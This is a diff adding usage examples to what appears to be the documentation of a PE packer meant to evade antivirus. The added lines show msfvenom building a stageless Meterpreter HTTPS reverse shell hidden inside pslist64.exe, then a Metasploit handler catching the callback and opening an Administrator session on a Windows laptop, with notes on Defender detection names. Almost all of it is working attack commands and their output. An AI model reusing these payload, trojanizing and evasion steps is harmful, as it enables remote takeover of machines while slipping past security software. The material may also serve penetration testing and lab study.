@@ -152,6 +152,16 @@ Example 2 - Generate and run a packed version of a Meterpreter (x64) HTTPS rever
 Step 1 - Use Msfvenom to generate a Meterpreter HTTPS reverse shell (x64)
 ---------------------------------------------------------------------------------------------------------------------------------------
 
+jeff@kali:~/Documents/Tools/shellcodeexec$ msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.1.30 lport=443 EXITFUNC=thread 
+HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem -a x64 -e x64/shikata_ga_nai -x ./pslist64.exe -f exe -o shellcode-stageless-pslistx64.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] Skipping invalid encoder x64/shikata_ga_nai
+[!] Couldn't find encoder to use
+No encoder specified, outputting raw payload
+Payload size: 201308 bytes
+Final size of exe file: 392704 bytes
+Saved as: shellcode-stageless-pslistx64.exe
+
 
 ---------------------------------------------------------------------------------------------------------------------------------------
 Step 2 - Use 'AtomPePacker' to generate a packed version of the Meterpreter HTTPS reverse shell (x64)
@@ -195,3 +205,59 @@ Important note regarding AV detection
    detect these actions as 'Behavior:Win32/Meterpreter.gen!D' or 'Behavior:Win32/Meterpreter.A!sms' and will kill the Meterpreter session.
                 
                 
+jeff@kali:~/Documents/Tools$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST 192.168.1.30; 
+set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; 
+set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"                                                                                             
+
+[sudo] password for jeff:                                                                                                                                  
+                                                                                          
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View a module's description using 
+info, or the enhanced version in your browser with 
+info -d
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/meterpreter_reverse_https
+LHOST => 192.168.1.30
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+msf6 exploit(multi/handler) > 
+msf6 exploit(multi/handler) > 
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: rndvosh6) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: rndvosh6) Redirecting stageless connection from /9M8GoXCz6YifKp4o_Iz5wAsYVwiqty4f5-5Z3pu5MnNzGIkZBG29-R4PLyLJVV with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: rndvosh6) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: rndvosh6) Attaching orphaned/stageless session...
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: rndvosh6) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-24 03:41:49 +0100
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                        Connection
+  --  ----  ----                     -----------                        ----------
+  1         meterpreter x64/windows  Laptop1\Administrator @ Laptop1  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: Laptop1\Administrator
+
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
